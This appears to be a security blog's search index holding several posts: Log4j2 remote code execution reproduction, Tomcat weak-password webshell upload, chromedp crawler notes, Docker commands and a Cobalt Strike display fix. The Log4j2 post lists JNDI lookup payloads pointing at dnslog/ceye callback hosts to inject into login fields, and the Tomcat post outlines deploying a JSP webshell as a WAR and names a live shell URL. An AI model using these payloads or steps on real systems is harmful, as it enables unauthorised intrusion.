<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ApacheLog4j2远程代码执行漏洞</title>
    <url>/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响</p>
<span id="more"></span>

<p>github地址：</p>
<blockquote>
<p><a href="https://github.com/tangxiaofeng7/apache-log4j-poc">https://github.com/tangxiaofeng7/apache-log4j-poc</a></p>
</blockquote>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>网传POC：</p>
<p>在登录口用户名密码都登录打一下就知道了</p>
<blockquote>
<p>${jndi:ldap:&#x2F;&#x2F;xxxxx.dnslog.cn&#x2F;exp}</p>
<p>${jndi:rmi:&#x2F;&#x2F;xxxxx.dnslog.cn&#x2F;exp}</p>
</blockquote>
<blockquote>
<p>${jndi:ldap:&#x2F;&#x2F;exp.ajvkiz.ceye.io&#x2F;exp}</p>
<p>${jndi:rmi:&#x2F;&#x2F;exp.ajvkiz.ceye.io&#x2F;exp}</p>
</blockquote>
<p>经验证Icloud存在此洞，中国是UTC+8时区：</p>
<p><img src="/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2f308afa104f2ad3da3e2bde13484d92.png" alt="截图"></p>
<p><img src="/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/88cd9267ae68013e5edc34ac011d1f00.png" alt="截图"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>log4j</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat弱口令Getshell</title>
    <url>/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4Getshell/</url>
    <content><![CDATA[<h2 id="常用用户"><a href="#常用用户" class="headerlink" title="常用用户"></a>常用用户</h2><p>admin&#x2F;tomcat&#x2F;root</p>
<h2 id="生成恶意war包"><a href="#生成恶意war包" class="headerlink" title="生成恶意war包"></a>生成恶意war包</h2><p>将冰蝎jsp木马打包成zip，修改zip后缀为war</p>
<span id="more"></span>

<h2 id="上传恶意war包"><a href="#上传恶意war包" class="headerlink" title="上传恶意war包"></a>上传恶意war包</h2><p><img src="/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4Getshell/6097a99c92eb8052417c0c0b7881975e.png" alt="截图"></p>
<h2 id="连接shell"><a href="#连接shell" class="headerlink" title="连接shell"></a>连接shell</h2><p>那么shell地址（有个二级目录）：</p>
<p><a href="http://124.70.64.48:45528/shell/shell.jsp">http://124.70.64.48:45528/shell/shell.jsp</a></p>
<p><img src="/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4Getshell/3322edbe1156cb2615c493364a37a9d7.png" alt="截图"></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>web安全</tag>
        <tag>tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>chromedp仿真爬虫</title>
    <url>/chromedp%E4%BB%BF%E7%9C%9F%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>golang仿真爬虫包</p>
<h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><blockquote>
<p>完全模拟人工操作</p>
<p>支持Chrome DevTools Protocol</p>
</blockquote>
<span id="more"></span>

<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><blockquote>
<p>自动化测试、爬虫、自动签到等等人工能完成的所有操作</p>
</blockquote>
<h3 id="反爬策略绕过方式"><a href="#反爬策略绕过方式" class="headerlink" title="反爬策略绕过方式"></a>反爬策略绕过方式</h3><blockquote>
<p>常见的验证方式：</p>
</blockquote>
<blockquote>
<ol>
<li>扫码登陆</li>
<li>短信验证</li>
<li>图形验证</li>
<li>点击验证</li>
<li>其他</li>
</ol>
</blockquote>
<blockquote>
<p>绕过思路：</p>
</blockquote>
<blockquote>
<p>人工完成验证</p>
</blockquote>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><blockquote>
<p>比较吃资源，因为chrome本身比较吃内存。</p>
</blockquote>
<h2 id="使用入门"><a href="#使用入门" class="headerlink" title="使用入门"></a>使用入门</h2><h3 id="浏览器初始化默认参数"><a href="#浏览器初始化默认参数" class="headerlink" title="浏览器初始化默认参数"></a>浏览器初始化默认参数</h3><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> DefaultExecAllocatorOptions = [...]ExecAllocatorOption&#123;</span><br><span class="line">	NoFirstRun,</span><br><span class="line">	NoDefaultBrowserCheck,</span><br><span class="line">	Headless,</span><br><span class="line"></span><br><span class="line">	Flag(<span class="string">&quot;disable-background-networking&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;enable-features&quot;</span>, <span class="string">&quot;NetworkService,NetworkServiceInProcess&quot;</span>),</span><br><span class="line">	Flag(<span class="string">&quot;disable-background-timer-throttling&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;disable-backgrounding-occluded-windows&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;disable-breakpad&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;disable-client-side-phishing-detection&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;disable-default-apps&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;disable-dev-shm-usage&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;disable-extensions&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;disable-features&quot;</span>, <span class="string">&quot;site-per-process,Translate,BlinkGenPropertyTrees&quot;</span>),</span><br><span class="line">	Flag(<span class="string">&quot;disable-hang-monitor&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;disable-ipc-flooding-protection&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;disable-popup-blocking&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;disable-prompt-on-repost&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;disable-renderer-backgrounding&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;disable-sync&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;force-color-profile&quot;</span>, <span class="string">&quot;srgb&quot;</span>),</span><br><span class="line">	Flag(<span class="string">&quot;metrics-recording-only&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;safebrowsing-disable-auto-update&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">	Flag(<span class="string">&quot;enable-automation&quot;</span>, <span class="literal">true</span>),  <span class="comment">// 会显示自动化测试标识</span></span><br><span class="line">	Flag(<span class="string">&quot;password-store&quot;</span>, <span class="string">&quot;basic&quot;</span>),</span><br><span class="line">	Flag(<span class="string">&quot;use-mock-keychain&quot;</span>, <span class="literal">true</span>),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="用前须知"><a href="#用前须知" class="headerlink" title="用前须知"></a>用前须知</h2><p>chromedp使用context参数传递上下文，用以区分不同浏览器，同时将操作串联成线。</p>
<p>chromedp需要初始化，主要指定浏览器运行时的一些参数，以及何时回收资源(关闭浏览器)。</p>
<p>chromedp使用run方法，传递符合chromedp.Action接口的动作，以调用这些动作。</p>
<h2 id="常用功能："><a href="#常用功能：" class="headerlink" title="常用功能："></a>常用功能：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chromedp.NewContext() 初始化chromedp的上下文，后续这个页面都使用这个上下文进行操作</span><br><span class="line"></span><br><span class="line">chromedp.Run() 运行一个chrome的一系列操作</span><br><span class="line"></span><br><span class="line">chromedp.Navigate() 将浏览器导航到某个页面</span><br><span class="line"></span><br><span class="line">chromedp.Title() 检索页面title</span><br><span class="line"></span><br><span class="line">chromedp.WaitVisible() 等候某个元素可见，再继续执行。</span><br><span class="line"></span><br><span class="line">chromedp.WaitNotVisible(`#docsubject`, chromedp.ByID) 等元素消失时</span><br><span class="line"></span><br><span class="line">chromedp.Click() 模拟鼠标点击某个元素</span><br><span class="line"></span><br><span class="line">chromedp.Value() 获取某个元素的value值</span><br><span class="line"></span><br><span class="line">chromedp.ActionFunc() 再当前页面执行某些自定义函数</span><br><span class="line"></span><br><span class="line">chromedp.Text() 读取某个元素的text值</span><br><span class="line"></span><br><span class="line">chromedp.Evaluate() 执行某个js，相当于控制台输入js</span><br><span class="line"></span><br><span class="line">network.SetExtraHTTPHeaders() 截取请求，额外增加header头</span><br><span class="line"></span><br><span class="line">chromedp.SendKeys() 模拟键盘操作，输入字符</span><br><span class="line"></span><br><span class="line">chromedp.Nodes() 根据xpath获取某些元素，并存储进入数组</span><br><span class="line"></span><br><span class="line">chromedp.NewRemoteAllocator</span><br><span class="line"></span><br><span class="line">chromedp.OuterHTML() 获取元素的outer html</span><br><span class="line"></span><br><span class="line">chromedp.Screenshot() 根据某个元素截图</span><br><span class="line"></span><br><span class="line">page.CaptureScreenshot() 截取整个页面的元素</span><br><span class="line"></span><br><span class="line">chromedp.Submit() 提交某个表单</span><br><span class="line"></span><br><span class="line">chromedp.WaitNotPresent() 等候某个元素不存在，比如“正在搜索。。。”</span><br><span class="line"></span><br><span class="line">chromedp.Stop() 停止网页加载（不停止的话，有时会长时间加载）</span><br></pre></td></tr></table></figure>

<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://github.com/chromedp/chromedp">https://github.com/chromedp/chromedp</a></p>
<p><a href="https://www.baidu.com/s?ie=UTF-8&amp;wd=chromedp">https://www.baidu.com/s?ie=UTF-8&amp;wd=chromedp</a></p>
<h2 id="简单调试"><a href="#简单调试" class="headerlink" title="简单调试"></a>简单调试</h2><p>分解动作，动作之间穿插输出，判断程序运行状况。</p>
<h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><h3 id="开启gomod支持"><a href="#开启gomod支持" class="headerlink" title="开启gomod支持"></a>开启gomod支持</h3><blockquote>
<p>go env -w GO111MODULE&#x3D;on</p>
<p>go env -w GOPROXY&#x3D;<a href="https://goproxy.io,direct/">https://goproxy.io,direct</a></p>
</blockquote>
<h3 id="示例：访问百度，并搜索"><a href="#示例：访问百度，并搜索" class="headerlink" title="示例：访问百度，并搜索"></a>示例：访问百度，并搜索</h3><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/chromedp/chromedp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ctx, _ := chromedp.NewExecAllocator(</span><br><span class="line">		context.Background(),</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 以默认配置的数组为基础，覆写headless参数</span></span><br><span class="line">		<span class="comment">// 当然也可以根据自己的需要进行修改，这个flag是浏览器的设置</span></span><br><span class="line">		<span class="built_in">append</span>(</span><br><span class="line">			chromedp.DefaultExecAllocatorOptions[:],</span><br><span class="line">			chromedp.Flag(<span class="string">&quot;headless&quot;</span>, <span class="literal">false</span>), <span class="comment">// 显示界面</span></span><br><span class="line">		)...,</span><br><span class="line">	)</span><br><span class="line">	ctx, _ = chromedp.NewContext(</span><br><span class="line">		ctx,</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	chromedp.Run(ctx, chromedp.Navigate(<span class="string">&quot;http://www.baidu.com&quot;</span>))</span><br><span class="line">	chromedp.Run(ctx, chromedp.SendKeys(<span class="string">`#kw`</span>, <span class="string">&quot;111&quot;</span>, chromedp.ByID))</span><br><span class="line">	fmt.Println(<span class="string">&quot;等待两秒&quot;</span>)</span><br><span class="line">	chromedp.Run(ctx, chromedp.WaitVisible(<span class="string">`#su`</span>, chromedp.ByID))</span><br><span class="line">	<span class="comment">//chromedp.Run(ctx, chromedp.Click(`document.querySelector(&quot;#su&quot;)`, chromedp.ByJSPath))</span></span><br><span class="line">	chromedp.Run(ctx, chromedp.Click(<span class="string">`document.querySelector(&quot;#su&quot;)`</span>, chromedp.ByJSPath))</span><br><span class="line">	<span class="comment">//chromedp.Run(ctx, chromedp.Click(`#su`, chromedp.ByID))</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><h3 id="注意点一"><a href="#注意点一" class="headerlink" title="注意点一"></a>注意点一</h3><p>可以使用<code>chromedp.Flag(&quot;headless&quot;, false)</code>参数显示浏览器，默认是隐藏的，然而从实践中得知，初始化时只要指定<code>headless参数，</code>不管是<code>chromedp.Flag(&quot;headless&quot;, false)</code>还是<code>chromedp.Flag(&quot;headless&quot;, true)</code>，chrome都会显示，除非不指定<code>headless</code>参数，浏览器才会隐藏。</p>
<p>从github的issue页面中得知，当启用headless隐藏浏览器时，此时user-agent会发生变化(添加了headless标识)，应该在初始化时手动指定user-agent。</p>
<p>从github的issue页面中得知，如果想对google的一些资产进行自动化测试，应该指定<code>enable-automation</code>参数为<code>false</code>，关闭自动化测试标识符，此时浏览器将不再显示”Chrome正受到自动化测试软件的控制。”字样，如下图：</p>
<blockquote>
<p><img src="/chromedp%E4%BB%BF%E7%9C%9F%E7%88%AC%E8%99%AB/0217666eb3f392002f2ec9fd272d69ec.png" alt="截图"></p>
</blockquote>
<h3 id="注意点二"><a href="#注意点二" class="headerlink" title="注意点二"></a>注意点二</h3><p>chromedp无法处理Alert的弹窗内容，如果页面出现Alert，将会导致页面永久加载下去，chromedp将无法进行其他动作，解决这个问题有两个方法：</p>
<blockquote>
<p>方法一：</p>
<p>手动关闭弹窗，chromedp将会恢复</p>
<p>方法二：</p>
<p>使用chromedp操控js控制台，屏蔽弹窗，代码：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// create context</span></span><br><span class="line">    ctx, cancel := chromedp.NewContext(context.Background())</span><br><span class="line">    <span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// run task list</span></span><br><span class="line">    <span class="keyword">var</span> res <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">    err := chromedp.Run(ctx,</span><br><span class="line">    chromedp.Navigate(<span class="string">`https://www.quackit.com/javascript/javascript_alert_box.cfm`</span>), <span class="comment">// navigate to random page</span></span><br><span class="line">    chromedp.EvaluateAsDevTools(<span class="string">`window.alert = function (txt)&#123;return txt&#125;`</span>, &amp;res), <span class="comment">// set a function to return the text in the alert box as text</span></span><br><span class="line">    chromedp.EvaluateAsDevTools(<span class="string">`alert(&#x27;hehe&#x27;)`</span>, &amp;res), <span class="comment">// create an alert box to test the execution</span></span><br><span class="line">)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    log.Println(res)</span><br></pre></td></tr></table></figure>

<p>参考文章：</p>
<p><a href="https://stackoverflow.com/questions/58085607/chromedp-handle-alert">https://stackoverflow.com/questions/58085607/chromedp-handle-alert</a></p>
</blockquote>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker常用命令</title>
    <url>/Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="容器-amp-镜像操作"><a href="#容器-amp-镜像操作" class="headerlink" title="容器&amp;镜像操作"></a>容器&amp;镜像操作</h2><p>进入容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it &lt;dockerId&gt; /bin/bash</span><br></pre></td></tr></table></figure>

<p>从dockerfile构建镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t [自定义名称]:[自定义tag] .</span><br><span class="line">注意最后有个点</span><br></pre></td></tr></table></figure>

<p>从镜像启动环境(随机端口)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd -P [指定镜像名称]:[指定镜像tag]</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>从镜像启动环境(指定端口，如果要映射多个端口，则需要多个-p参数)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd -p [主机端口]:[容器端口] [指定镜像名称]:[指定镜像tag]</span><br></pre></td></tr></table></figure>

<p>列出镜像对外开放的端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker inspect --format=&#x27;&#123;&#123;.Config.ExposedPorts&#125;&#125;&#x27; a8fb5a6d1b4d</span><br></pre></td></tr></table></figure>

<p>删除镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rmi [镜像名:tag或id]</span><br><span class="line"></span><br><span class="line">如果commit之后删不掉原来的镜像:</span><br><span class="line">docker rmi [镜像名:tag]</span><br></pre></td></tr></table></figure>

<p>修改镜像tag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker tag [要修改的镜像id] [新镜像名称]:[新tag]</span><br></pre></td></tr></table></figure>

<p>列出所有容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p>列出运行中的容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p>停止容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop [容器名或ID]</span><br></pre></td></tr></table></figure>

<p>启动停止的容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start [容器名或ID]</span><br></pre></td></tr></table></figure>

<p>删除指定容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm [容器名或ID]</span><br></pre></td></tr></table></figure>

<p>删除所有容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm -f $(docker ps -a -q)</span><br></pre></td></tr></table></figure>

<p>删除所有镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rmi -f $(docker images -a -q)</span><br></pre></td></tr></table></figure>

<p>重置Docker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker system prune -a -f</span><br></pre></td></tr></table></figure>

<p>将容器保存为新的模板镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker commit [容器id]  [要保存的镜像名]:[标签]</span><br></pre></td></tr></table></figure>

<p>导出tar包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker save &gt; xxx.tar [name:tag]</span><br></pre></td></tr></table></figure>

<p>导入tar包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker load -i [xxx.tar]</span><br></pre></td></tr></table></figure>

<h3 id="镜像迁移"><a href="#镜像迁移" class="headerlink" title="镜像迁移"></a>镜像迁移</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pull</span><br><span class="line">docker pull registry.cn-hongkong.aliyuncs.com/toys/viper:latest</span><br><span class="line"></span><br><span class="line">打包</span><br><span class="line">docker save -o qwe.tar registry.cn-hongkong.aliyuncs.com/toys/viper:latest</span><br></pre></td></tr></table></figure>

<p>文章导航：</p>
<p><a href="https://blog.csdn.net/weixin_28871731/article/details/112110328">https://blog.csdn.net/weixin_28871731/article/details/112110328</a></p>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>拷贝文件到docker容器中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp ./[物理机上文件] [容器ID]:[保存位置绝对路径如/usr/local/samba/etc/smb.conf]</span><br></pre></td></tr></table></figure>

<h2 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h2><p>从已有的image自动映射端口:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM vulhub/spring-messaging:5.0.4</span><br><span class="line">EXPOSE 8080</span><br></pre></td></tr></table></figure>

<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ol>
<li>docker save 应该指定镜像名和tag，不应该指定ID，尤其是在更新镜像版本的时候</li>
<li>docker rmi 应该指定镜像名和tag，不应该指定ID，尤其是在更新镜像版本的时候</li>
</ol>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>虚拟化</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>cobaltstrike中文乱码解决</title>
    <url>/cobaltstrike%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<h2 id="CobaltStrike-乱码解决"><a href="#CobaltStrike-乱码解决" class="headerlink" title="CobaltStrike 乱码解决"></a>CobaltStrike 乱码解决</h2><p>Windows电脑上CS乱码了，文字都变成空心方块了。</p>
<p>这里总结了网上的所有方法，推荐使用方法3。</p>
<span id="more"></span>

<h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>cmd输入：regedit，进入注册表</p>
<p>找到：计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor</p>
<p>新建字符串值，然后编辑字符串</p>
<p>数值名称：autorun</p>
<p>数值数据：chcp 65001</p>
<p>注：chcp是dos命令 后面的65001是utf-8编码的代号</p>
<p>只输入chcp可以看当前编码。</p>
<p><img src="/cobaltstrike%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3/8e058c4d12dc8faf8757be0f56522a72.png" alt="截图"></p>
<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>修改  当前用户&#x2F;.aggressor.prop</p>
<p>在最后一行加入</p>
<p><code>client.font.font=Microsoft-YaHei-UI 10</code></p>
<p><img src="/cobaltstrike%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3/a47f823734aad59daa35cd6dcd7a0bec.png" alt="截图"></p>
<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>使用下面的命令启动客户端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java  -Dfile.encoding=utf-8 -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>cobaltstrike</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title>fofa语法收藏</title>
    <url>/fofa%E8%AF%AD%E6%B3%95%E6%94%B6%E8%97%8F/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="9811511692e63f617f3dd9631d9a09de5eb6d508dcd36c8459397ebf3c21c29a">752362f5ec3b41ce653b8ac1e8d295518a03314f40497f8235cbc667a7033c19cd6538185812e1966222f594107763cadb269aece451c65fdacfd0e3b420612445ebc62c379ea943cd634751b2790270b81f11e5bb42f222e26d15c2463e5f97a9a0cd2f76fdf9091a98dc7f46e699754501ced87692870072f3f832e9eeb298fd73b6ac634ac7706f9a87ddf63eaeddaffd43fceb0a1ba93dd9d175b66564c6793815387409974f703b9c5f3882b6943f8ede9d7691761c6d70f99dfedb3f0e4da1683c6a5f6eff2bcd43f9633c26b3c53164ff6e030d76a08207dc4311676ad2c7c49721cb8353d72b61e80c360c5f9c388ccfaafa1d762766d97c3da1459e687dd7beecfc35b25a0a320b0be937422bd9b8581e28dc8063afed270ceb93971232231bf99e61aa993995c484f08769b984afb69fcbba8195034c50c257bec3546a6729889d3a77cae208c8b513cd08b198aeaa296fd3ed76decd2bd938aa11c07f8841f64ac97dae796f9a9713a119be6924944d29a9fc1c322cdeae2cf17b027827071f9ed1ce8e2051406669db1f663b8b79a7c85c0e5736e85f6f32dc3c1fa7c4bec1be73bb090e11d876195bc6b683b483b80f5d1128ecc9d798a9723a9e9cfc8f08bbd3975f28e6afaad5ac3281d9c0f96266f9712ebf85215f85517c45269b81a8c3981a3f1b7f6331c99b5064b8ffbfc4abd0b263fb310623b97859b3d1182ae5ba7e85f2537eb29c1e2356636b516618788257bf8de5e09fdb270443f9b2476c73e04b091c8c7936249fd15571d8ee6f533d86a13b1774495fd14d6572c0d3d96566cb8a7f201cb736234cefb75544da143e0d2d44afe5f3df074479a72ce7e38b23bd79c0fa1b9bf5513f3765b3c2e33370527a2b4d70153a02f258d0828496ad378e8c88b15e6e7115786589b32ade042b79e1de2c87b5199fb3e7fcbcbb22e987e3a6eb07b02a8501214c9c43d429ed5123f001e3827588f977b56f255767e3b243cd3069055efbbb8fc71c2041a0f9b586279245e2be87f68d9bee373529f7cd3f53174ecb0d235baedc321ad3f4b46348fa0dcbc3bf148cce01ae780d5992780a93bed1c9af6787cbe37c30984740afee9391de2af698544cdf62a639925514bb8092d3dd3cb08767ef195c1e5b763ffe2590d13647c06ba43284887856b80d06167ad0fc0f77a21b7ed75468336cad484b981d430a15da89f19275bb194ff468f0a5738421cbfdbc0dfc0afa8796bc12820e55a305fa948ced13135ae4333d0d3a022d9b9e17e72a1ecbb7f08ab2e55ff51a64eb0d92d46918a0bde30c06f31ab178173d9e6c90604ba4bc65c921d4bf925e680cfc3ab52cc2d003d299d9228d45d00f57b8c807d79db7fe1b57451ec11cb1cbb85b916015032a8a2866703de3886f0164fea2f79fa0922b2bc491b74d40cecb88adb93eeb58f797d9598777a8740d421bd04715aea886cfb80952600fc7cd1b013f1c43099aeee3e92e8b8aea329ed5a624f13a424ed82af61996b4c71828fefdc3a770c5bddc0831c95f1a873c965a27019133dbc2f741b204125f4f9e1fe171687ad211d9fe1400dd40397db4afcf534c889c3d3378e88593410c93041ce19a9c0e3ce37f6c832772d7afa7094e1b4cfbdc2d89534ff11f4fe2565d9476e553bf6380f81657d3034779a382d54bff687b3db37ce5955b70192bde5d4874bb00312ef390eb052edd6058957678396f507e0ce86926dfaea918005ed8251eb7c8104364050027bf7985ff9bb99f5e21f4cf9b10c822947928ad932d3fbcc5641e26299654bef858fda84aa2d22787c69aa8a235ebb1be85301904675e02840dbe67537e597d7e4f76076678e4fbfac3898e96985b62583d9e7875f6b618a184cee7431e79216fb57cb3b9e797dbe45a036c380456c3f3723971aa64c04cabc98df4d65536243ff3a0e6d88edec549a1e33d9a554ae7b45ba90f70927acc151bc2d4867422aaec0fcc5375ea6b569b084d70dfabd12f37d6f6090855965a24d9fcea772458204bc149b641e1e338715fa70ffc5cfcd11113175f25f0aeecf302fbc2a6a4bbc2fbf860d03667fd6b991b0a6569dcfbc43b9d10f799417a66305b747b79945b36eca611b6dd8c3267d0d1e69909dab72606ba56c20d051f56f4821936e4d17f4084a47cc2cc50f4b42beb920294e1092544dcf664061ec202d81ab37e1323ff95421e58b3e22789a14ed1db7bf4ec17ec42c54dab7fc0e938311be4fa811d42ed06a08577701acc76ff5503b0c4ba02265ff1f6b1376f029a96767bd83fb5c2760b5c1b367bc7bc4dfd8d1c8bf5c3770d46b741f3eea127bc1ea9d9fddb2309490bdce18b2b46c73d64819292c30bb97a62a0bfc6676665622b30d0ed3cf750bd76729c57dafec68a5daf076e7cb1e13cf741bf5686853460436ab23f5421aaa3c8824cd6df85d0279d6af4cff8fb7130fa66ba142b09bd4e253c9ec191cbff6eeb6266f0e8388c4323a8b0a090b3e328e2208b23468a9a80d01232ab6a9e5d519b672aefa5e86337679685375b0eb7bc6ad7cd5c6e8cd44536759648e57466</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>安全技巧</category>
      </categories>
      <tags>
        <tag>fofa</tag>
        <tag>安全技巧</tag>
        <tag>private</tag>
      </tags>
  </entry>
  <entry>
    <title>cobaltstrike相关注意事项</title>
